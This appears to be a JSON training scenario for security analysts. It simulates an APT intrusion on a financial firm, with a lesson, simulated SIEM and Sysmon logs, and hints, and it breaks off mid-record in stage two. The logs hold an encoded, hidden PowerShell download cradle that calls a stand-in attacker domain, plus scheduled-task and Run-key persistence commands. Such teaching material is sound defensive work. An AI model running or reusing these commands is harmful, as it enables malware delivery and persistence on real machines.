{
  "name": "Multi-Stage APT Campaign \u2014 Full Kill Chain",
  "description": "An advanced scenario simulating a complete APT campaign by threat group 'SilkTyphoon' targeting a financial services company. Covers the full Cyber Kill Chain from spearphishing initial access through credential theft, lateral movement, data exfiltration, and ransomware impact. Analysts must investigate 30+ logs across 5 stages, identify all compromised systems, and recommend containment actions.",
  "difficulty": "ADVANCED",
  "category": "Advanced Persistent Threat",
  "mitreAttackIds": ["T1566.001", "T1059.001", "T1547.001", "T1003.001", "T1550.002", "T1021.002", "T1486", "T1070.001"],
  "briefing": "## CRITICAL ALERT \u2014 This is not a drill.\n\nYour SIEM has correlated multiple high-severity alerts into a single incident chain targeting your organization. Initial indicators suggest a sophisticated threat actor with characteristics matching APT group **'SilkTyphoon'** (known for targeting financial services).\n\nThe attack appears to have originated from a **spearphishing email** sent to the CFO. Multiple systems may already be compromised.\n\n### What We Know So Far\n\n- **08:45 UTC** \u2014 Targeted phishing email delivered to CFO (r.johnson)\n- **08:47 UTC** \u2014 Malicious macro execution detected on WS-EXEC01\n- **09:xx UTC** \u2014 C2 beaconing observed to external infrastructure\n- **10:xx UTC** \u2014 Credential theft indicators on compromised host\n- **11:xx UTC** \u2014 Lateral movement across multiple servers\n- **13:xx UTC** \u2014 Large data transfers to external IPs\n- **14:xx UTC** \u2014 Ransomware indicators and anti-forensics activity\n\n### Your Mission\n\n1. **Investigate** every stage of this attack from initial access to impact\n2. **Identify** all compromised systems, accounts, and attacker infrastructure\n3. **Collect evidence** by flagging critical logs in each stage\n4. **Recommend containment actions** at each phase\n5. **Build a complete timeline** of the attack progression\n\n### Affected Assets\n\n| Hostname | IP Address | Role |\n|---|---|---|\n| WS-EXEC01 | 10.0.1.25 | CFO Workstation |\n| WS-PC20 | 10.0.1.60 | Employee Workstation |\n| SRV-FS01 | 10.0.3.10 | File Server |\n| SRV-APP02 | 10.0.3.25 | Application Server |\n| SRV-DC01 | 10.0.2.5 | Domain Controller |\n\n### Known Threat Actor Infrastructure\n\n| Indicator | Type |\n|---|---|\n| 185.191.32.44 | C2 Server |\n| cdn-update.silktyphoon.xyz | C2 Domain |\n| 91.215.85.17 | Exfiltration Server |\n\n**Time is critical \u2014 the attacker is still active...**",
  "lessonContent": "# Multi-Stage APT Campaign \u2014 Pre-Investigation Lesson\n\nBefore you begin this advanced investigation, review the key concepts you will need to analyze a full-spectrum APT attack.\n\n---\n\n## 1. The Cyber Kill Chain (Lockheed Martin Model)\n\nThe Cyber Kill Chain is a framework developed by Lockheed Martin that describes the stages of a cyber intrusion. Understanding this model helps defenders identify where an attack is in its lifecycle and where to intervene.\n\n| Phase | Description | Defender Opportunity |\n|---|---|---|\n| **1. Reconnaissance** | Attacker researches the target (OSINT, LinkedIn, public filings) | Monitor for targeted scanning, social engineering attempts |\n| **2. Weaponization** | Attacker creates a deliverable payload (malicious document, exploit kit) | Threat intelligence sharing, sandbox analysis |\n| **3. Delivery** | Payload is transmitted to the target (email, web, USB) | Email gateway filtering, web proxies, user awareness |\n| **4. Exploitation** | Vulnerability or user action triggers execution (macro, exploit) | Endpoint protection, application whitelisting, patching |\n| **5. Installation** | Malware is installed for persistent access (backdoor, implant) | EDR detection, file integrity monitoring, behavioral analysis |\n| **6. Command & Control** | Malware communicates with attacker infrastructure | Network monitoring, DNS analysis, proxy inspection |\n| **7. Actions on Objectives** | Attacker achieves their goal (data theft, destruction, ransom) | DLP, network segmentation, incident response |\n\n**Key Insight:** Every phase the attacker completes successfully makes detection and containment harder. The earlier you detect, the lower the impact.\n\n---\n\n## 2. APT Group Characteristics\n\nAdvanced Persistent Threats are fundamentally different from opportunistic attacks:\n\n### What Makes an APT \"Advanced\"?\n- **Custom tooling** \u2014 Bespoke malware, zero-day exploits, living-off-the-land binaries (LOLBins)\n- **Operational security** \u2014 Encrypted C2, domain fronting, traffic blending\n- **Defense evasion** \u2014 Timestomping, log clearing, process injection, fileless techniques\n\n### What Makes an APT \"Persistent\"?\n- **Multiple persistence mechanisms** \u2014 Registry keys AND scheduled tasks AND services\n- **Redundant C2 channels** \u2014 Primary HTTP/S beacon, fallback DNS tunnel\n- **Re-compromise capability** \u2014 Stolen credentials cached for later use\n- **Patience** \u2014 Weeks to months of dwell time before final objectives\n\n### What Makes an APT a \"Threat\"?\n- **Specific targeting** \u2014 Tailored spearphishing, industry-specific lures\n- **Clear objectives** \u2014 Intellectual property theft, financial fraud, espionage, disruption\n- **Resourced operators** \u2014 Nation-state backing or well-funded criminal organizations\n\n---\n\n## 3. Kill Chain Phases Mapped to MITRE ATT&CK\n\nThis scenario covers the following MITRE ATT&CK techniques at each kill chain phase:\n\n### Initial Access (Delivery + Exploitation)\n- **T1566.001 \u2014 Phishing: Spearphishing Attachment** \u2014 Malicious Excel document with embedded macro sent to a high-value target\n\n### Execution\n- **T1059.001 \u2014 Command and Scripting Interpreter: PowerShell** \u2014 Macro launches PowerShell to download and execute the second-stage payload\n\n### Persistence (Installation)\n- **T1547.001 \u2014 Boot or Logon Autostart Execution: Registry Run Keys** \u2014 Malware adds itself to HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run for persistence across reboots\n\n### Credential Access\n- **T1003.001 \u2014 OS Credential Dumping: LSASS Memory** \u2014 Attacker dumps credentials from the Local Security Authority Subsystem Service (LSASS) process memory\n\n### Lateral Movement\n- **T1550.002 \u2014 Use Alternate Authentication Material: Pass the Hash** \u2014 Attacker uses stolen NTLM hashes to authenticate to remote systems without knowing plaintext passwords\n- **T1021.002 \u2014 Remote Services: SMB/Windows Admin Shares** \u2014 Attacker uses PsExec and admin shares (C$, ADMIN$) to execute commands on remote hosts\n\n### Impact\n- **T1486 \u2014 Data Encrypted for Impact** \u2014 Ransomware encrypts files across compromised systems for extortion\n\n### Defense Evasion\n- **T1070.001 \u2014 Indicator Removal: Clear Windows Event Logs** \u2014 Attacker clears event logs to destroy forensic evidence\n\n---\n\n## 4. How to Investigate Each Phase\n\n### Phase 1: Initial Access Investigation\n- Check email gateway logs for the delivery vector (sender, subject, attachment hashes)\n- Look for SPF/DKIM/DMARC failures or spoofed sender domains\n- Identify the targeted user and their workstation\n- Check if any other users received the same email\n\n### Phase 2: Execution & Persistence Investigation\n- Look for Office applications spawning script interpreters (Word/Excel -> cmd/powershell)\n- Check Sysmon Event 1 for process creation chains\n- Identify the payload download URL and C2 infrastructure\n- Search for persistence mechanisms: registry keys (Event 13), scheduled tasks (Event 1 with schtasks), services (Event 7045)\n- Look for renamed binaries or files in unusual directories\n\n### Phase 3: Credential Theft Investigation\n- Check for LSASS access (Sysmon Event 10 with TargetImage lsass.exe)\n- Look for known credential dumping tools (Mimikatz, ProcDump, comsvcs.dll)\n- Check for SeDebugPrivilege assignment (Event 4672)\n- Monitor for explicit credential logon events (Event 4648)\n\n### Phase 4: Lateral Movement Investigation\n- Track network logon events (Event 4624 Type 3) across multiple hosts\n- Look for NTLM authentication where Kerberos would be normal\n- Check for PsExec service installation (PSEXESVC) on remote hosts\n- Monitor SMB traffic patterns (port 445) between internal hosts\n- Watch for domain enumeration commands (net group, nltest, etc.)\n\n### Phase 5: Impact Investigation\n- Look for file compression (7zip, WinRAR) of sensitive directories\n- Monitor for large outbound transfers to external IPs\n- Check for ransomware indicators: mass file modifications, vssadmin shadow copy deletion\n- Look for anti-forensics: event log clearing (Event 1102), timestomping\n\n---\n\n## 5. Incident Response Priorities\n\nWhen responding to an active APT compromise, follow this priority order:\n\n### Contain (First Priority)\n1. **Isolate compromised endpoints** from the network (but do NOT power off \u2014 preserve memory)\n2. **Block C2 infrastructure** at the firewall and DNS level\n3. **Disable compromised accounts** (especially domain admin)\n4. **Segment critical assets** (domain controllers, file servers)\n\n### Eradicate (Second Priority)\n1. **Remove persistence mechanisms** (registry keys, scheduled tasks, services)\n2. **Clean or reimage compromised systems** (reimaging is preferred)\n3. **Reset ALL credentials** that may have been exposed (assume all cached credentials are compromised)\n4. **Patch the initial access vector** (email filtering rules, endpoint protection updates)\n\n### Recover (Third Priority)\n1. **Restore from known-good backups** (verify backup integrity first)\n2. **Monitor for re-compromise indicators** (the attacker will try to return)\n3. **Implement additional detection rules** based on observed TTPs\n4. **Conduct a full threat hunt** across the environment\n\n---\n\n## 6. The Importance of Threat Intelligence\n\nThreat intelligence transforms reactive security into proactive defense:\n\n- **Strategic intel** \u2014 Who targets your industry? What are their objectives?\n- **Tactical intel** \u2014 What TTPs does the threat group use? What does their malware look like?\n- **Operational intel** \u2014 What infrastructure do they use? What domains, IPs, and tools?\n- **Technical intel** \u2014 IOCs: file hashes, IP addresses, domain names, YARA rules\n\n### Applying Threat Intel in This Scenario\n\n- The threat group **SilkTyphoon** is known to target financial services\n- Their typical kill chain matches what you will observe: spearphishing -> PowerShell -> credential theft -> lateral movement -> double extortion (exfil + ransom)\n- Known infrastructure patterns: bulletproof hosting providers, fast-flux DNS, .xyz TLD domains\n- Sharing IOCs from this incident with ISACs and partner organizations helps protect the broader community\n\n---\n\n## Ready?\n\nThis is the most challenging scenario in the training platform. You will analyze 30+ logs across 5 attack stages and answer 15 checkpoint questions testing your ability to investigate, classify, and respond to a real-world APT campaign.\n\nClick **Continue to Investigation** to begin. Good luck, analyst.",
  "estimatedMinutes": 75,
  "isActive": true,
  "stages": [
    {
      "stageNumber": 1,
      "title": "Initial Access \u2014 Spearphishing the CFO",
      "description": "A targeted spearphishing email was delivered to the CFO's mailbox containing a weaponized Excel document. The macro executed immediately upon opening, launching PowerShell to download a second-stage payload from the attacker's C2 infrastructure.",
      "unlockCondition": "AFTER_PREVIOUS",
      "logs": [
        {
          "logType": "EMAIL_GATEWAY",
          "summary": "Email Gateway \u2014 Inbound email from external sender 'david.chen@partnerfin-group.com' to CFO r.johnson@corpsec.local with subject 'Q3 Financial Report - Urgent Review Required'. Attachment: Q3-Financial-Report.xlsm (macro-enabled Excel). SPF passed but DMARC alignment failed.",
          "rawLog": {
            "messageId": "<4a8f2e1d-9c3b-47a2-b8e6-1f5d3c7a9b2e@mail.partnerfin-group.com>",
            "timestamp": "2025-10-14T08:45:11Z",
            "direction": "INBOUND",
            "sender": "david.chen@partnerfin-group.com",
            "senderDisplayName": "David Chen - Partner Financial Group",
            "recipient": "r.johnson@corpsec.local",
            "subject": "Q3 Financial Report - Urgent Review Required",
            "attachments": [
              {
                "filename": "Q3-Financial-Report.xlsm",
                "size": 284672,
                "contentType": "application/vnd.ms-excel.sheet.macroEnabled.12",
                "sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
              }
            ],
            "spfResult": "pass",
            "dkimResult": "pass",
            "dmarcResult": "fail",
            "dmarcAlignment": "relaxed-fail",
            "xMailer": "Microsoft Outlook 16.0",
            "receivedHeaders": [
              "from mail-out01.bulletproof-host.net (185.191.32.44) by mx01.corpsec.local",
              "from internal-relay.partnerfin-group.com (10.50.1.2) by mail-out01.bulletproof-host.net"
            ],
            "threatScore": 35,
            "action": "DELIVERED",
            "quarantineReason": null,
            "headerAnalysis": {
              "returnPath": "bounce-handler@bulletproof-host.net",
              "replyTo": "david.chen@partnerfin-group.com",
              "xOrigIP": "185.191.32.44"
            }
          },
          "severity": "MEDIUM",
          "hostname": "MX-GW01",
          "username": "r.johnson",
          "sourceIp": "185.191.32.44",
          "destIp": "10.0.1.25",
          "timestamp": "2025-10-14T08:45:11Z",
          "isEvidence": true,
          "evidenceTag": "phishing-email-delivery",
          "sortOrder": 1
        },
        {
          "logType": "SYSMON",
          "summary": "Sysmon Event 1 \u2014 Process creation: EXCEL.EXE spawned powershell.exe on WS-EXEC01. This is a classic indicator of malicious macro execution. The PowerShell command uses -EncodedCommand with a Base64 payload.",
          "rawLog": {
            "EventID": 1,
            "Source": "Microsoft-Windows-Sysmon",
            "UtcTime": "2025-10-14T08:47:33Z",
            "ProcessGuid": "{a1b2c3d4-e5f6-7890-abcd-ef0123456789}",
            "ProcessId": 7324,
            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "CommandLine": "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ADsAJABjAGwAaQBlAG4AdAAuAEQAbwB3AG4AbABvAGEAZABGAGkAbABlACgAJwBoAHQAdABwAHMAOgAvAC8AYwBkAG4ALQBzAGUAYwB1AHIAaQB0AHkALgBzAGkAbABrAHQAeQBwAGgAbwBvAG4ALgB4AHkAegAvAHUAcABkAGEAdABlAC4AZABhAHQAJwAsACAAJwBDADoAXABVAHMAZQByAHMAXAByAC4AagBvAGgAbgBzAG8AbgBcAEEAcABwAEQAYQB0AGEAXABMAG8AYwBhAGwAXABUAGUAbQBwAFwAdQBwAGQAYQB0AGUALgBkAGEAdAAnACkA",
            "CurrentDirectory": "C:\\Users\\r.johnson\\Documents\\",
            "User": "CORPSEC\\r.johnson",
            "LogonGuid": "{a1b2c3d4-0001-0002-0003-000000000001}",
            "LogonId": "0x3E7A1B",
            "TerminalSessionId": 1,
            "IntegrityLevel": "Medium",
            "Hashes": "SHA256=6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b",
            "ParentProcessGuid": "{a1b2c3d4-abcd-1234-5678-901234567890}",
            "ParentProcessId": 3456,
            "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
            "ParentCommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE\" \"C:\\Users\\r.johnson\\Downloads\\Q3-Financial-Report.xlsm\"",
            "ParentUser": "CORPSEC\\r.johnson"
          },
          "severity": "HIGH",
          "hostname": "WS-EXEC01",
          "username": "r.johnson",
          "processName": "powershell.exe",
          "eventId": "1",
          "timestamp": "2025-10-14T08:47:33Z",
          "isEvidence": true,
          "evidenceTag": "macro-powershell-execution",
          "sortOrder": 2
        },
        {
          "logType": "EDR_ALERT",
          "summary": "EDR Alert (HIGH) \u2014 Office application spawned a script interpreter. EXCEL.EXE launched powershell.exe with encoded command on WS-EXEC01 as user r.johnson. This matches MITRE ATT&CK technique T1059.001.",
          "rawLog": {
            "alertId": "EDR-2025-18744",
            "severity": "HIGH",
            "timestamp": "2025-10-14T08:47:34Z",
            "hostname": "WS-EXEC01",
            "username": "r.johnson",
            "processName": "powershell.exe",
            "processPath": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "commandLine": "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand JABjAGwAaQBlAG4AdA...",
            "parentProcess": "EXCEL.EXE",
            "parentProcessPath": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
            "alertType": "Office Application Spawned Script Interpreter",
            "detectionRule": "OFFICE_CHILD_SCRIPTING_ENGINE",
            "mitreTactic": "Execution",
            "mitreTechnique": "T1059.001",
            "riskScore": 92,
            "action": "ALERT_ONLY",
            "fileHash": "6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b",
            "networkConnections": [
              {
                "destIp": "185.191.32.44",
                "destPort": 443,
                "protocol": "HTTPS"
              }
            ]
          },
          "severity": "HIGH",
          "hostname": "WS-EXEC01",
          "username": "r.johnson",
          "processName": "powershell.exe",
          "sourceIp": "10.0.1.25",
          "destIp": "185.191.32.44",
          "timestamp": "2025-10-14T08:47:34Z",
          "isEvidence": true,
          "evidenceTag": "edr-macro-execution-alert",
          "sortOrder": 3
        },
        {
          "logType": "SYSMON",
          "summary": "Sysmon Event 3 \u2014 Network connection: powershell.exe on WS-EXEC01 initiated outbound HTTPS connection to 185.191.32.44:443 (C2 server). This is the payload download triggered by the macro.",
          "rawLog": {
            "EventID": 3,
            "Source": "Microsoft-Windows-Sysmon",
            "UtcTime": "2025-10-14T08:47:36Z",
            "ProcessGuid": "{a1b2c3d4-e5f6-7890-abcd-ef0123456789}",
            "ProcessId": 7324,
            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "User": "CORPSEC\\r.johnson",
            "Protocol": "tcp",
            "Initiated": true,
            "SourceIsIpv6": false,
            "SourceIp": "10.0.1.25",
            "SourceHostname": "WS-EXEC01.corpsec.local",
            "SourcePort": 49721,
            "SourcePortName": "",
            "DestinationIsIpv6": false,
            "DestinationIp": "185.191.32.44",
            "DestinationHostname": "",
            "DestinationPort": 443,
            "DestinationPortName": "https"
          },
          "severity": "HIGH",
          "hostname": "WS-EXEC01",
          "username": "r.johnson",
          "processName": "powershell.exe",
          "sourceIp": "10.0.1.25",
          "destIp": "185.191.32.44",
          "eventId": "3",
          "timestamp": "2025-10-14T08:47:36Z",
          "isEvidence": true,
          "evidenceTag": "c2-payload-download",
          "sortOrder": 4
        },
        {
          "logType": "DNS",
          "summary": "DNS Query \u2014 WS-EXEC01 resolved cdn-update.silktyphoon.xyz to 185.191.32.44. This is the C2 domain used by the SilkTyphoon threat actor for payload delivery and command-and-control.",
          "rawLog": {
            "timestamp": "2025-10-14T08:47:35Z",
            "queryId": 48291,
            "sourceIp": "10.0.1.25",
            "sourcePort": 54832,
            "dnsServer": "10.0.2.5",
            "queryName": "cdn-update.silktyphoon.xyz",
            "queryType": "A",
            "queryClass": "IN",
            "responseCode": "NOERROR",
            "responseData": "185.191.32.44",
            "ttl": 300,
            "flags": "QR RD RA",
            "answerCount": 1,
            "hostname": "WS-EXEC01",
            "registrationDate": "2025-09-28",
            "registrar": "NameSilo LLC",
            "whoisOrg": "REDACTED FOR PRIVACY"
          },
          "severity": "HIGH",
          "hostname": "WS-EXEC01",
          "sourceIp": "10.0.1.25",
          "destIp": "10.0.2.5",
          "timestamp": "2025-10-14T08:47:35Z",
          "isEvidence": true,
          "evidenceTag": "c2-domain-resolution",
          "sortOrder": 5
        },
        {
          "logType": "PROXY",
          "summary": "Proxy Log \u2014 HTTPS connection from WS-EXEC01 (10.0.1.25) to cdn-update.silktyphoon.xyz (185.191.32.44) downloading encoded payload file 'update.dat' (287 KB). User-Agent indicates PowerShell webclient.",
          "rawLog": {
            "timestamp": "2025-10-14T08:47:37Z",
            "sourceIp": "10.0.1.25",
            "sourcePort": 49721,
            "destIp": "185.191.32.44",
            "destPort": 443,
            "method": "GET",
            "url": "https://cdn-update.silktyphoon.xyz/update.dat",
            "httpVersion": "1.1",
            "statusCode": 200,
            "contentType": "application/octet-stream",
            "contentLength": 294400,
            "userAgent": "Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.19041.1",
            "referer": "-",
            "action": "ALLOWED",
            "category": "Uncategorized",
            "tlsVersion": "TLSv1.2",
            "sniHostname": "cdn-update.silktyphoon.xyz",
            "hostname": "WS-EXEC01",
            "username": "r.johnson",
            "bytesIn": 294400,
            "bytesOut": 512,
            "duration": 1.8
          },
          "severity": "HIGH",
          "hostname": "WS-EXEC01",
          "username": "r.johnson",
          "sourceIp": "10.0.1.25",
          "destIp": "185.191.32.44",
          "timestamp": "2025-10-14T08:47:37Z",
          "isEvidence": true,
          "evidenceTag": "c2-payload-proxy-log",
          "sortOrder": 6
        }
      ],
      "hints": [
        {
          "content": "Check the email gateway log carefully. The SPF result says 'pass' but look at the DMARC alignment and the Return-Path header. The actual originating IP (X-Orig-IP) points to the C2 server, not a legitimate mail server.",
          "pointsPenalty": 3,
          "sortOrder": 1
        },
        {
          "content": "The Sysmon Event 1 log shows the critical parent-child relationship: EXCEL.EXE spawned powershell.exe. Office applications should NEVER spawn command interpreters. The -EncodedCommand flag contains a Base64-encoded download cradle.",
          "pointsPenalty": 3,
          "sortOrder": 2
        },
        {
          "content": "The DNS log reveals the C2 domain: cdn-update.silktyphoon.xyz, registered only 16 days before the attack. The domain resolves to 185.191.32.44, which is the same IP in the email Received headers and the proxy download log.",
          "pointsPenalty": 5,
          "sortOrder": 3
        }
      ]
    },
    {
      "stageNumber": 2,
      "title": "Execution & Persistence \u2014 Establishing a Foothold",
      "description": "The attacker's payload has been downloaded and decoded. A persistent backdoor is installed via registry Run key and scheduled task. The implant begins beaconing to the C2 server at regular intervals while disguising itself as a legitimate Windows process.",
      "unlockCondition": "AFTER_PREVIOUS",
      "logs": [
        {
          "logType": "SYSMON",
          "summary": "Sysmon Event 11 \u2014 File creation: PowerShell dropped decoded payload to C:\\Users\\r.johnson\\AppData\\Local\\Temp\\svchost32.exe. Note the deceptive filename mimicking the legitimate svchost.exe but located in an AppData temp directory.",
          "rawLog": {
            "EventID": 11,
            "Source": "Microsoft-Windows-Sysmon",
            "UtcTime": "2025-10-14T08:47:42Z",
            "ProcessGuid": "{a1b2c3d4-e5f6-7890-abcd-ef0123456789}",
            "ProcessId": 7324,
            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "TargetFilename": "C:\\Users\\r.johnson\\AppData\\Local\\Temp\\svchost32.exe",
            "CreationUtcTime": "2025-10-14T08:47:42Z",
            "User": "CORPSEC\\r.johnson",
            "Hashes": "SHA256=d4735e3a265e16eee03f59718b9b5d03019c07d8b6c51f90da3a666eec13ab35"
          },
          "severity": "HIGH",
          "hostname": "WS-EXEC01",
          "username": "r.johnson",
          "processName": "powershell.exe",
          "eventId": "11",
          "timestamp": "2025-10-14T08:47:42Z",
          "isEvidence": true,
          "evidenceTag": "payload-file-drop",
          "sortOrder": 1
        },
        {
          "logType": "SYSMON",
          "summary": "Sysmon Event 13 \u2014 Registry value set: Run key modified on WS-EXEC01. Value 'WindowsSecurityUpdate' added to HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run pointing to the dropped payload. This ensures the malware survives reboots.",
          "rawLog": {
            "EventID": 13,
            "Source": "Microsoft-Windows-Sysmon",
            "UtcTime": "2025-10-14T08:48:05Z",
            "EventType": "SetValue",
            "ProcessGuid": "{a1b2c3d4-e5f6-7890-abcd-ef0123456789}",
            "ProcessId": 7324,
            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "TargetObject": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsSecurityUpdate",
            "Details": "C:\\Users\\r.johnson\\AppData\\Local\\Temp\\svchost32.exe --silent --config %APPDATA%\\Microsoft\\config.dat",
            "User": "CORPSEC\\r.johnson"
          },
          "severity": "HIGH",
          "hostname": "WS-EXEC01",
          "username": "r.johnson",
          "processName": "powershell.exe",
          "eventId": "13",
          "timestamp": "2025-10-14T08:48:05Z",
          "isEvidence": true,
          "evidenceTag": "registry-persistence",
          "sortOrder": 2
        },
        {
          "logType": "SYSMON",
          "summary": "Sysmon Event 1 \u2014 Process creation: powershell.exe executed schtasks.exe to create a scheduled task named 'MicrosoftEdgeUpdateCore' as backup persistence. Task runs svchost32.exe every 15 minutes.",
          "rawLog": {
            "EventID": 1,
            "Source": "Microsoft-Windows-Sysmon",
            "UtcTime": "2025-10-14T08:48:18Z",
            "ProcessGuid": "{b2c3d4e5-f6a7-8901-bcde-f01234567890}",
            "ProcessId": 8412,
            "Image": "C:\\Windows\\System32\\schtasks.exe",
            "CommandLine": "schtasks /create /tn \"MicrosoftEdgeUpdateCore\" /tr \"C:\\Users\\r.johnson\\AppData\\Local\\Temp\\svchost32.exe --silent\" /sc minute /mo 15 /f",
            "CurrentDirectory": "C:\\Users\\r.johnson\\AppData\\Local\\Temp\\",
            "User": "CORPSEC\\r.johnson",
            "LogonGuid": "{a1b2c3d4-0001-0002-0003-000000000001}",
            "LogonId": "0x3E7A1B",
            "IntegrityLevel": "Medium",
            "Hashes": "SHA256=bc64ab8f5b2b1b9e5a60c3e34f1e98d8a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6",
            "ParentProcessGuid": "{a1b2c3d4-e5f6-7890-abcd-ef0123456789}",
            "ParentProcessId": 7324,
            "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "ParentCommandLine": "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand..."
          },
          "severity": "HIGH",
          "hostname": "WS-EXEC01",
          "username": "r.johnson",
          "processName": "schtasks.exe",
          "eventId": "1",
          "timestamp": "2025-10-14T08:48:18Z",
          "isEvidence": true,
          "evidenceTag": "scheduled-task-persistence",
          "sortOrder": 3
        },
        {
          "logType": "EDR_ALERT",
          "summary": "EDR Alert (HIGH) \u2014 Multiple persistence mechanisms detected on WS-EXEC01. Registry Run key and scheduled task both point to the same suspicious binary in AppData\\Local\\Temp. Binary name 'svchost32.exe' appears to masquerade as legitimate svchost.exe.",
          "rawLog": {
            "alertId": "EDR-2025-18746",
            "severity": "HIGH",
            "timestamp": "2025-10-14T08:48:20Z",
            "hostname": "WS-EXEC01",
            "username": "r.johnson",
            "processName": "svchost32.exe",
            "processPath": "C:\\Users\\r.johnson\\AppData\\Local\\Temp\\svchost32.exe",
            "alertType": "Multiple Persistence Mechanisms Detected",
            "detectionRule": "PERSISTENCE_REGISTRY_AND_SCHTASK_COMBO",
            "mitreTactic": "Persistence",
            "mitreTechnique": "T1547.001",
            "riskScore": 88,
            "indicators": [
              {
                "type": "registry_run_key",
                "path": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsSecurityUpdate",
                "value": "C:\\Users\\r.johnson\\AppData\\Local\\Temp\\svchost32.exe --silent --config %APPDATA%\\Microsoft\\config.dat"
              },
              {
                "type": "scheduled_task",
                "name": "MicrosoftEdgeUpdateCore",
                "action": "C:\\Users\\r.johnson\\AppData\\Local\\Temp\\svchost32.exe --silent",
                "trigger": "Every 15 minutes"
              }
            ],
            "binaryAnalysis": {
              "name": "svchost32.exe",
              "sha256": "d4735e3a265e16eee03f59718b9b5d03019c07d8b6c51f90da3a666eec13ab35",
              "signed": false,
              "originalFilename": "beacon_x64.exe",
              "compileTimestamp": "2025-10-10T03:22:15Z",
              "entropy": 7.4
            }
          },
          "severity": "HIGH",
          "hostname": "WS-EXEC01",
          "username": "r.johnson",
          "processName": "svchost32.exe",
          "timestamp": "2025-10-14T08:48:20Z",
          "isEvidence": true,
          "evidenceTag": "edr-persistence-alert",
          "sortOrder": 4
        },
        {
          "logType": "SYSMON",
          "summary": "Sysmon Event 3 \u2014 Network connection: svchost32.exe on WS-EXEC01 initiated outbound HTTPS connection to 185.191.32.44:443. This is the initial C2 beacon from the implant after successful installation.",
          "rawLog": {
            "EventID": 3,
            "Source": "Microsoft-Windows-Sysmon",
            "UtcTime": "2025-10-14T08:49:01Z",
            "ProcessGuid": "{c3d4e5f6-a7b8-9012-cdef-012345678901}",
            "ProcessId": 9104,
            "Image": "C:\\Users\\r.johnson\\AppData\\Local\\Temp\\svchost32.exe",
            "User": "CORPSEC\\r.johnson",
            "Protocol": "tcp",
            "Initiated": true,
            "SourceIsIpv6": false,
            "SourceIp": "10.0.1.25",
            "SourceHostname": "WS-EXEC01.corpsec.local",
            "SourcePort": 49755,
            "DestinationIsIpv6": false,
            "DestinationIp": "185.191.32.44",
            "DestinationHostname": "cdn-update.silktyphoon.xyz",
            "DestinationPort": 443,
            "DestinationPortName": "https"
          },
          "severity": "HIGH",
          "hostname": "WS-EXEC01",
          "username": "r.johnson",
          "processName": "svchost32.exe",
          "sourceIp": "10.0.1.25",
          "destIp": "185.191.32.44",
          "eventId": "3",
          "timestamp": "2025-10-14T08:49:01Z",
          "isEvidence": true,
          "evidenceTag": "c2-beacon-initial",
          "sortOrder": 5
        },
        {
          "logType": "NETWORK_FLOW",
          "summary": "Network Flow \u2014 Repeating outbound HTTPS connections from WS-EXEC01 to 185.191.32.44:443 observed at 60-second intervals. Traffic pattern consistent with C2 beaconing. Each connection transfers approximately 1-2 KB outbound with variable inbound responses.",
          "rawLog": {
            "timestamp": "2025-10-14T09:15:00Z",
            "flowSummary": "Aggregated flow data for 10.0.1.25 -> 185.191.32.44:443",
            "srcIp": "10.0.1.25",
            "srcHostname": "WS-EXEC01",
            "dstIp": "185.191.32.44",
            "dstPort": 443,
            "protocol": "TCP",
            "observationWindow": "08:49:01 - 09:15:00",
            "connectionCount": 26,
            "averageInterval": "60.2s",
            "intervalStdDev": "1.8s",
            "totalBytesOut": 38912,
            "totalBytesIn": 52480,
            "avgBytesPerConnectionOut": 1497,
            "avgBytesPerConnectionIn": 2018,
            "jitter": "low",
            "beaconingScore": 0.97,
            "tlsVersion": "TLSv1.2",
            "ja3Hash": "e7d705a3286e19ea42f587b344ee6865",
            "ja3sHash": "ae4edc6faf64d08308082ad26be60767",
            "action": "ALLOW"
          },
          "severity": "HIGH",
          "hostname": "WS-EXEC01",
          "sourceIp": "10.0.1.25",
          "destIp": "185.191.32.44",
          "timestamp": "2025-10-14T09:15:00Z",
          "isEvidence": true,
          "evidenceTag": "c2-beaconing-pattern",
          "sortOrder": 6
        },
        {
          "logType": "WINDOWS_EVENT",
          "summary": "Windows Event 4688 \u2014 New process created: svchost32.exe launched from C:\\Users\\r.johnson\\AppData\\Local\\Temp\\. This is the renamed malicious binary masquerading as the legitimate Windows svchost.exe. Note the non-standard path and the '32' suffix.",
          "rawLog": {
            "EventID": 4688,
            "Source": "Microsoft-Windows-Security-Auditing",
            "TimeCreated": "2025-10-14T08:49:00Z",
            "Computer": "WS-EXEC01.corpsec.local",
            "SubjectUserSid": "S-1-5-21-3842939050-3880317879-2865463114-1142",
            "SubjectUserName": "r.johnson",
            "SubjectDomainName": "CORPSEC",
            "SubjectLogonId": "0x3E7A1B",
            "NewProcessId": "0x2390",
            "NewProcessName": "C:\\Users\\r.johnson\\AppData\\Local\\Temp\\svchost32.exe",
            "TokenElevationType": "%%1936",
            "ProcessId": "0x1C9C",
